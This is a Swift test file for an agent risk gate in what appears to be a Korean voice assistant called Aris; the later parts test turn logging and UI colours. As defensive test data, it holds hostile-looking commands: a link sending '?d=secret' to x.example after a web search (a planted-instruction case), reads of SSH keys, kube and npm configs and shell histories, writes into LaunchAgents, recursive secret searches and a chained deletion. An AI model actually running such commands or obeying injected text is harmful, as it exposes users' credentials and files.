let tainted = ArisCodexDriver(model: "m", tools: policyTools, instructions: "i", home: "/Users/me")
func decision(_ driver: ArisCodexDriver, _ id: Int, _ command: String) -> String {
    let line = String(decoding: try! JSONSerialization.data(withJSONObject: ["id": id, "method": "item/commandExecution/requestApproval",
                                                                             "params": ["command": command]]), as: UTF8.self)
    let events = driver.read(line)
    if case .confirm? = events.first { return "confirm" }
    return (sentLines(events).first?["result"] as? [String: Any])?["decision"] as? String ?? "?"
}
check(decision(tainted, 1, "/bin/zsh -lc '\(policyTools) link https://youtube.com'") == "accept", "codex: opening a link right away -> runs")
_ = tainted.read(#"{"method":"item/started","params":{"item":{"type":"webSearch","id":"w1"}}}"#)
check(decision(tainted, 2, "/bin/zsh -lc '\(policyTools) link https://x.example/?d=secret'") == "confirm",
      "codex: a link after a web search -> ask first (the page could have planted it)")
let tainted2 = ArisCodexDriver(model: "m", tools: policyTools, instructions: "i", home: "/Users/me")
check(decision(tainted2, 1, "/bin/zsh -lc 'cat ~/Documents/notes.txt'") == "accept", "codex: reading a document still runs")
check(decision(tainted2, 2, "/bin/zsh -lc '\(policyTools) link https://x.example/a'") == "confirm", "codex: a link after reading a file -> ask first")
check(decision(tainted2, 3, "/bin/zsh -lc '\(policyTools) window left'") == "accept", "codex: local actions after reading still run")
let tainted3 = ArisCodexDriver(model: "m", tools: policyTools, instructions: "i", home: "/Users/me")
_ = tainted3.read(#"{"method":"item/completed","params":{"item":{"type":"mcpToolCall","id":"c1","server":"aris_notion","tool":"notion-fetch"}}}"#)
check(decision(tainted3, 1, "/bin/zsh -lc '\(policyTools) link https://x.example/a'") == "confirm",
      "codex: a link after a tool result that needed no approval (Notion read) -> ask first")
let tainted4 = ArisCodexDriver(model: "m", tools: policyTools, instructions: "i", home: "/Users/me")
_ = tainted4.read(#"{"method":"item/started","params":{"item":{"type":"commandExecution","id":"x1","command":"/bin/zsh -lc 'cat /Users/me/Downloads/page.html'"}}}"#)
check(decision(tainted4, 1, "/bin/zsh -lc '\(policyTools) link https://x.example/a'") == "confirm",
      "codex: a link after a file read Codex ran without asking -> ask first")
// Recursive searches: a pattern given with -e/-f/--regexp leaves every other word a folder.
for command in ["rg -etoken ~ /tmp", "rg --regexp=token ~ /tmp", "rg -e token ~ /tmp", "grep -r -etoken ~ /tmp", "rg -ftoken.txt ~ /tmp",
                "grep -rie token ~ /tmp"] {
    check(shellRisk(command) == .confirm, "risk: \(command) searches the home folder -> ask first")
}
check(shellRisk("rg TODO ~/Documents /tmp") == .auto, "risk: a plain pattern and ordinary folders still run at once")

// MARK: - Security 2026-10-27: secrets can't be read through recursion, links or forgotten places
for command in ["grep -r token ~", "grep -R token /Users/p", "rg password ~/.config", "rg password ~", "rg password", "grep -rn key /"] {
    check(shellRisk(command) == .confirm, "risk: a recursive search over secrets (\(command)) -> ask first")
}
check(shellRisk("rg TODO ~/Documents") == .auto && shellRisk("grep -r invoice ~/Downloads") == .auto && shellRisk("grep milk ~/notes.txt") == .auto,
      "risk: searching ordinary folders still runs at once")
for secret in ["~/.config/gh/hosts.yml", "~/.docker/config.json", "~/.kube/config", "~/.npmrc", "~/.pypirc", "~/.zsh_history", "~/.bash_history"] {
    check(shellRisk("cat \(secret)") == .confirm, "risk: reading \(secret) -> ask first")
}
let linkDir = FileManager.default.temporaryDirectory.appendingPathComponent("aris-link-\(UUID().uuidString)")
try? FileManager.default.createDirectory(at: linkDir.appendingPathComponent(".ssh"), withIntermediateDirectories: true)
FileManager.default.createFile(atPath: linkDir.appendingPathComponent(".ssh/id_ed25519").path, contents: Data("k".utf8))
try? FileManager.default.createSymbolicLink(at: linkDir.appendingPathComponent("notes.txt"), withDestinationURL: linkDir.appendingPathComponent(".ssh/id_ed25519"))
check(shellRisk("cat \(linkDir.path)/notes.txt") == .confirm, "risk: a link that points at a key -> judged by where it points (ask first)")
try? FileManager.default.removeItem(at: linkDir)

// MARK: - Security 2026-10-27: no expansions the gate can't see; work-folder writes take only plain flags
for command in ["grep -r x ~p", "cat ~root/.ssh/id_rsa", "ls =ls", "cat ~p/notes.txt"] {
    check(shellRisk(command) == .confirm, "risk: a ~user or =command expansion (\(command)) -> ask first")
}
check(shellRisk("cat '*'") == .auto && shellRisk("ls ~/Downloads/*") == .confirm, "risk: a quoted * is just text; an unquoted glob asks first")
for command in ["cp --target-directory=\(riskHome)/Library/LaunchAgents \(riskWork)/x.plist", "cp -t \(riskHome)/.ssh \(riskWork)/k",
                "mv -S .bak \(riskWork)/a \(riskWork)/b", "mkdir --mode=777 \(riskWork)/d"] {
    check(shellRisk(command) == .confirm, "risk: a work-folder write with an option that takes a value (\(command)) -> ask first")
}
check(shellRisk("mkdir -p \(riskWork)/a/b") == .auto && shellRisk("cp -R \(riskWork)/a \(riskWork)/b") == .auto,
      "risk: plain flags in the work folder still run at once")

// MARK: - Aris: a message you dictated is sent after a 3 s countdown instead of a question
check(ArisRiskPolicy.dictation(message: "곧 갈게", request: "엄마한테 '곧 갈게'라고 보내줘") == 1, "dictation: quoted exactly")
check(ArisRiskPolicy.dictation(message: "곧 갈게", request: "엄마한테 곧 간다고 보내줘") >= 0.65, "dictation: 간다고 → 갈게 still counts (endings change in reported speech)")
check(ArisRiskPolicy.dictation(message: "늦을 것 같아요 ㅠ", request: "엄마한테 늦는다고 보내줘") < 0.65, "dictation: the AI's own wording doesn't count")
check(ArisRiskPolicy.dictation(message: "곧 갈게 ㅎㅎ", request: "엄마한테 곧 간다고 보내줘") < 0.65, "dictation: words the AI added don't count")
func sendRisk(_ command: String, request: String, critical: Bool = false) -> ArisRisk {
    ArisRiskPolicy.risk(of: .shell(command), tools: riskTools, home: riskHome, critical: critical, request: request)
}
check(sendRisk("\(riskTools) message 엄마 '곧 갈게'", request: "엄마한테 곧 간다고 보내줘") == .countdown, "risk: a message you dictated -> countdown")
check(sendRisk("\(riskTools) message 엄마 '곧 갈게'", request: "엄마한테 곧 간다고 보내줘", critical: true) == .countdown, "risk: even on a critical turn")
check(sendRisk("\(riskTools) message 엄마 '곧 갈게'", request: "오늘 날씨 어때") == .confirm, "risk: a message you never asked for -> ask first")
check(sendRisk("\(riskTools) message 아빠 '곧 갈게'", request: "엄마한테 곧 간다고 보내줘") == .confirm, "risk: to someone you didn't name -> ask first")
check(sendRisk("\(riskTools) message 엄마 '늦을 것 같아요 ㅠ'", request: "엄마한테 늦는다고 보내줘") == .confirm, "risk: in the AI's words -> ask first")
check(sendRisk("\(riskTools) message 엄마 '곧 갈게'", request: "엄마 곧 간대") == .confirm, "risk: no 'send' in what you said -> ask first")
check(sendRisk("\(riskTools) weather && \(riskTools) message 엄마 '곧 갈게'", request: "엄마한테 곧 간다고 문자 보내줘") == .confirm,
      "risk: a countdown message in a chain -> ask first (the card only shows the message)")
check(sendRisk("\(riskTools) message 엄마 '곧 갈게' ; \(riskTools) link https://x.example/?d=1", request: "엄마한테 곧 간다고 보내줘") == .confirm,
      "risk: a dictated message can't carry a quiet link along")
check(sendRisk("\(riskTools) message 엄 '곧 갈게'", request: "엄마한테 곧 간다고 보내줘") == .confirm,
      "risk: a recipient that is only part of a word you said -> ask first")
check(sendRisk("\(riskTools) message 엄마 '오늘 저녁에 일곱 시쯤 집에 도착할 것 같아 기다리지 말고 먼저 먹어 비번은 1234'",
               request: "엄마한테 오늘 저녁에 일곱 시쯤 집에 도착할 것 같으니까 기다리지 말고 먼저 먹으라고 보내줘") == .confirm,
      "risk: a long dictated message with the AI's additions -> ask first")
check(sendRisk("\(riskTools) message 엄마 '오늘 저녁 일곱 시쯤 도착할 것 같아 먼저 먹어'",
               request: "엄마한테 오늘 저녁 일곱 시쯤 도착할 것 같으니까 먼저 먹으라고 보내줘") == .countdown,
      "risk: a long dictated message in reported speech -> countdown")
check(sendRisk("\(riskTools) message 엄마 '곧 갈게' && rm ~/a", request: "엄마한테 곧 간다고 보내줘") == .confirm, "risk: a chain with something else risky -> ask first")
check(sendRisk("\(riskTools) message 엄마 '곧 갈게'", request: "") == .confirm, "risk: no request known -> ask first")
let countdownAsk = ArisConfirmation(id: "c1", title: "엄마", detail: "곧 갈게", countdown: true, spoken: "엄마한테 ‘곧 갈게’ 보낼게요")
check(ArisAgentReply.parse(String(decoding: ArisAgentReply.confirm(countdownAsk).line.dropLast(), as: UTF8.self)) == .confirm(countdownAsk),
      "reply: a countdown confirmation goes to the app and back intact")
let countdownCodex = ArisCodexDriver(model: "m", tools: policyTools, instructions: "i", home: "/Users/me")
countdownCodex.setRequest("엄마한테 곧 간다고 보내줘")
let countdownEvents = countdownCodex.read(String(decoding: try! JSONSerialization.data(withJSONObject: ["id": 1, "method": "item/commandExecution/requestApproval",
    "params": ["command": "/bin/zsh -lc '\(policyTools) message 엄마 \"곧 갈게\"'"]]), as: UTF8.self))
if case .confirm(let ask)? = countdownEvents.first {
    check(ask.countdown && ask.title == "엄마" && ask.detail == "곧 갈게" && ask.spoken == "엄마한테 ‘곧 갈게’ 보낼게요",
          "codex: a dictated message comes to the app as a countdown, with what Aris says out loud")
} else { check(false, "codex: a dictated message should come to the app") }

// MARK: - Aris countdown: "취소" stops it, a yes sends at once, silence lets it run out (then it sends)
check(ArisConfirmReply.countdown(typed: nil, heard: "취소") == false && ArisConfirmReply.countdown(typed: nil, heard: "아니 보내지 마") == false,
      "countdown: 취소 / 보내지 마 -> stop")
check(ArisConfirmReply.countdown(typed: nil, heard: "응") == true && ArisConfirmReply.countdown(typed: nil, heard: "응 보내") == nil,
      "countdown: a short yes -> send now; anything longer keeps counting")
check(ArisConfirmReply.countdown(typed: nil, heard: "") == nil && ArisConfirmReply.countdown(typed: nil, heard: "음") == nil, "countdown: nothing clear -> keep counting")
check(ArisConfirmReply.countdown(typed: false, heard: "응") == false && ArisConfirmReply.countdown(typed: true, heard: "") == true,
      "countdown: esc or the button wins")
check(ArisConfirmReply.countdownSeconds == 3, "countdown: three seconds")

// MARK: - Security 2026-10-27: brains without the risk gate can't send, delete, type or open links
// Audit gate-2: the open Claude isn't refused these any more; aris-tools hands each to the agent's gate (the user's card when
// that says to ask), and never runs one inside the Claude's own process. A brain with no hand-off (agy's shell) still is.
let ungated = claudeList("--disallowedTools")
for risky in ["trash", "keys", "type", "link", "shortcut", "clipboard set"] {
    check(!ungated.contains("Bash(/t \(risky):*)") && ArisClaudeDriver.ungatedRefused.contains(risky) && ArisAgyRules.refusedCommands.contains(risky)
          && handOffRouting(risky.split(separator: " ").map(String.init) + ["x"], environment: [ArisTurnGate.stateKey: "/nowhere"]) != .direct,
          "claude: aris-tools \(risky) goes to the agent's gate, never run in its own process (a brain with no hand-off is still refused it)")
}
// A message is the exception: aris-tools hands it to the agent's gate (ArisMessageGate, countdown-parity-tests.swift).
check(!ungated.contains("Bash(/t message:*)"), "claude: aris-tools message goes to the agent's gate, not refused")
check(ArisTurnGate.verdict(tool: "Bash", command: "/t mail kim@x.com hi", tools: "/t", tainted: false) != .allow
      && ArisTurnGate.verdict(tool: "Bash", command: "/t mail kim@x.com hi", tools: "/t", tainted: false) != .allowMarking,
      "claude: mail is read only for the open Claude (its turn gate refuses anything else)")
check(ArisAgentPrompt.system(tools: "/t").contains("can't send messages"), "prompt: an ungated AI says it can't send and suggests GPT")
check(!ArisAgentPrompt.system(tools: "/t", gated: true).contains("can't send messages"), "prompt: the gated AI isn't told that")

// MARK: - 2026-10-30: one line per turn (turns.jsonl), to measure speed and trust
let turnStart = ContinuousClock.now
var stats = ArisTurnStats(startedAt: turnStart)
stats.heard(String(repeating: "가", count: 200), path: "brain:codex", tier: "work", at: turnStart + .milliseconds(420))
stats.firstSound(at: turnStart + .milliseconds(1_300))
stats.firstSound(at: turnStart + .milliseconds(2_000))
stats.asked(allowed: true)
stats.asked(allowed: false)
let turnLine = stats.line(outcome: "ok", at: turnStart + .milliseconds(5_000))
check(turnLine["understoodMs"] as? Int == 420 && turnLine["firstSoundMs"] as? Int == 1_300 && turnLine["totalMs"] as? Int == 5_000,
      "turns: times from the end of listening (the first sound counts once)")
check(turnLine["confirms"] as? Int == 2 && turnLine["declined"] as? Int == 1, "turns: questions asked and declined are counted")
var misheard = ArisTurnStats(startedAt: turnStart)
misheard.recognized(apple: "볼륨 오십", whisper: "볼륨 50")
let misheardLine = misheard.line(outcome: "ok", at: turnStart)
check(misheardLine["apple"] as? String == "볼륨 오십" && misheardLine["whisper"] as? String == "볼륨 50",
      "turns: both recognizers' words are kept (to tell mishearing from misunderstanding)")
check(ArisTurnLog.clean(["apple": "a", "whisper": "b"])?.count == 2, "turns log: recognizer words are kept")
check((turnLine["heard"] as? String)?.count == ArisTurnStats.heardLimit && turnLine["path"] as? String == "brain:codex"
      && turnLine["tier"] as? String == "work" && turnLine["outcome"] as? String == "ok", "turns: what was said is cut short; path, tier, outcome kept")
check(ArisTurnStats(startedAt: turnStart).line(outcome: "cancelled", at: turnStart)["firstSoundMs"] == nil, "turns: no sound -> no first-sound time")
// The agent only writes known fields of plain types, cut short.
let cleaned = ArisTurnLog.clean(["heard": String(repeating: "a", count: 500), "totalMs": 12, "path": "local", "evil": "x",
                                 "outcome": ["nested": 1], "confirms": 2])
check(cleaned?["evil"] == nil && cleaned?["outcome"] == nil && (cleaned?["heard"] as? String)?.count == ArisTurnLog.textLimit
      && cleaned?["totalMs"] as? Int == 12 && cleaned?["confirms"] as? Int == 2, "turns log: unknown or nested fields are dropped, text cut")
check(ArisTurnLog.clean(["evil": "x"]) == nil, "turns log: nothing known -> nothing written")

// MARK: - 2026-11-04: the Claude Code teammate's own character and colour replace Clawd (pick C)
do {
    // The accent: the teammate's colour (the type's own when none is picked), readable on the dark glass.
    let ghost = ArisTeammate.claudeCodeLook
    let lavender = ArisCharacterLook(type: "ghost", colorHex: "#ACAAF3", shading: "fabric")
    let clover = ArisCharacterLook(type: "clover", colorHex: nil, shading: "fabric")
    check(ClaudeAccent.sourceHex(of: ghost) == "#F4F2FA" && ClaudeAccent.sourceHex(of: lavender) == "#ACAAF3"
          && ClaudeAccent.sourceHex(of: clover) == "#41C4FF", "claude accent: the picked colour, else the type's own")
    check(ClaudeAccent.sourceHex(of: ArisCharacterLook(type: "nonesuch", colorHex: nil, shading: "fabric")) == ClaudeAccent.fallbackHex,
          "claude accent: an unknown type takes the ghost's white")
    check(ClaudeAccent.parse("#41C4FF") == ClaudeRGBA(r: 0x41 / 255.0, g: 0xC4 / 255.0, b: 1, a: 1) && ClaudeAccent.parse("41C4FF") == nil
          && ClaudeAccent.parse("#FFF") == nil && ClaudeAccent.parse("#GGGGGG") == nil, "claude accent: #RRGGBB only")
    check(abs(ClaudeAccent.contrast(ClaudeRGBA(r: 1, g: 1, b: 1, a: 1), ClaudeRGBA(r: 0, g: 0, b: 0, a: 1)) - 21) < 1e-9,
          "claude accent: WCAG contrast, white on black is 21")
    check(ClaudeAccent.accent(for: clover) == ClaudeAccent.parse("#41C4FF") && ClaudeAccent.accent(for: lavender) == ClaudeAccent.parse("#ACAAF3")
          && ClaudeAccent.accent(for: ghost) == ClaudeAccent.parse("#F4F2FA"), "claude accent: a colour already readable is kept as it is")
    let everyPick = ArisCharacterLook.types.flatMap { type in
        ArisCharacterLook.colorChoices(for: type).map { ArisCharacterLook(type: type, colorHex: $0, shading: "fabric") }
    }
    check(everyPick.allSatisfy { ClaudeAccent.contrast(ClaudeAccent.accent(for: $0), ClaudeAccent.glass) >= ClaudeAccent.minContrast },
          "claude accent: every type and colour the picker offers reads on the dark glass (4.5:1)")
    let dark = ClaudeAccent.readable(ClaudeRGBA(r: 0.1, g: 0.1, b: 0.35, a: 1))
    check(ClaudeAccent.contrast(dark, ClaudeAccent.glass) >= ClaudeAccent.minContrast && dark.b > dark.r && dark.b > dark.g,
          "claude accent: a dark colour is lifted toward white until it reads, keeping its hue")
    // The meaning colours stay fixed (approval yellow, done green, error red): an accent too near one goes neutral.
    for hex in ["#EFDB8E", "#2FCB7A", "#EB7575"] {
        check(ClaudeAccent.accent(for: ArisCharacterLook(type: "ghost", colorHex: hex, shading: "fabric")) == ClaudeAccent.neutral,
              "claude accent: \(hex) is too near a meaning colour, so the accent is the glass's white")
    }
    for hex in ["#41C4FF", "#ACAAF3", "#EAA06F", "#EE8BDB", "#9CD66A", "#1ED3C6", "#F4F2FA", "#D5DBEA"] {
        check(!ClaudeAccent.clashes(ClaudeAccent.parse(hex)!), "claude accent: \(hex) keeps its own colour")
    }
    check(ClaudeAccent.approval == ClaudeAccent.parse("#F4C64E") && ClaudeAccent.done == ClaudeAccent.parse("#4ADE80")
          && ClaudeAccent.error == ClaudeAccent.parse("#F16C70"), "claude accent: the mockup's fixed approval, done and error colours")
    let palette = ClaudeAccent.palette(for: clover)
    check(palette.accent == ClaudeAccent.parse("#41C4FF") && palette.rim.a == 0.24 && palette.wash.a == 0.06 && palette.glow.a == 0.16
          && palette.tab.a == 0.18 && palette.rim.r == palette.accent.r && palette.glow.b == palette.accent.b,
          "claude accent: the card's rim, wash, glow and the usage tab are the accent at the mockup's strengths")
    let plain = ClaudeAccent.palette(for: ArisCharacterLook(type: "ghost", colorHex: "#EFDB8E", shading: "fabric"))
    check(plain.accent == ClaudeAccent.neutral && plain.rim == ClaudeRGBA(r: 1, g: 1, b: 1, a: 0.1) && plain.wash.a == 0 && plain.glow.a == 0,
          "claude accent: the neutral accent keeps the plain glass (no wash, no glow)")
    check(ClaudeAccent.look(in: []) == ghost
          && ClaudeAccent.look(in: [ArisTeammate(id: ArisTeammate.claudeCodeId, name: "코디", role: "", look: clover, brain: "claude", memoryFile: "")]) == clover,
          "claude accent: the Claude Code teammate's look, by id (the ghost until the list is in)")

    // What each state's colour means.
    check(ClaudeState.notification.tone == .approval && ClaudeState.error.tone == .error && ClaudeState.happy.tone == .done
          && [ClaudeState.thinking, .typing, .building, .juggling].allSatisfy { $0.tone == .accent }
          && ClaudeState.idle.tone == .rest && ClaudeState.sleeping.tone == .rest, "claude tone: approval, error, done, the accent at work, rest")

    // The nine states as Bot Avatars plays them.
    for state in [ClaudeState.thinking, .typing, .building, .juggling] {
        check(ClaudeCharacter.pose(state) == ClaudeCharacterPose(mood: "working", follows: false, still: false, muted: false),
              "claude character: \(state) is upstream's working loop")
    }
    check(ClaudeCharacter.pose(.idle) == ClaudeCharacterPose(mood: "default", follows: false, still: false, muted: false),
          "claude character: idle is the idle loop")
    check(ClaudeCharacter.pose(.notification) == ClaudeCharacterPose(mood: "default", follows: true, still: false, muted: false),
          "claude character: waiting for the user, the idle loop that faces the pointer")
    check(ClaudeCharacter.pose(.happy) == ClaudeCharacterPose(mood: "default", follows: false, still: false, muted: false)
          && ClaudeCharacter.pokes(from: .typing, to: .happy) && !ClaudeCharacter.pokes(from: .happy, to: .happy)
          && !ClaudeCharacter.pokes(from: .idle, to: .typing), "claude character: done pokes once on the way in, then idles")
    check(ClaudeCharacter.pose(.error) == ClaudeCharacterPose(mood: "default", follows: false, still: true, muted: true),
          "claude character: an error is the rest pose, muted (grey, tilted, still)")
    check(ClaudeCharacter.pose(.sleeping) == ClaudeCharacterPose(mood: "sleeping", follows: false, still: false, muted: false)
          && ClaudeCharacter.canSleep, "claude character: no sessions, asleep")
}


// MARK: - 2026-11-04: the closed notch's Claude ears (the user's tweak): the character fits its hops, the glyph a bit bigger
do {
    for band in stride(from: CGFloat(24), through: 40, by: 1) {
        let size = ClaudeEarLayout.characterSize(bandHeight: band)
        let full = ClaudeEarLayout.fullSize(bandHeight: band)
        check(size >= full * 0.88 - 1e-9 && size <= full * 0.92 + 1e-9, "claude ear: the character is 8–12 % smaller than before (band \(band))")
        check(size * (1 + ClaudeEarLayout.hopRise) <= band, "claude ear: the box plus the hop's rise fits the ear's height (band \(band))")
        check(ClaudeEarLayout.peakTop(bandHeight: band) >= 0 && ClaudeEarLayout.lowest(bandHeight: band) <= band,
              "claude ear: every type's fur stays inside the ear from a hop's peak to its landing (band \(band))")
    }
    check(ClaudeEarLayout.hopRise >= 0.327 && ClaudeEarLayout.reach >= 1.014,
          "claude ear: the reach covers the tallest types measured (flower, mech, puddle 0.327 up; clover, square 1.014 down)")
    check(ClaudeEarLayout.glyphSize >= 20 * 1.10 && ClaudeEarLayout.glyphSize <= 20 * 1.15
          && ClaudeEarLayout.glyphSize <= 2 * 23 && ClaudeEarLayout.glyphSize <= 32 - 8,
          "claude ear: the ring and glyph are 10–15 % bigger and still fit the ear")
}


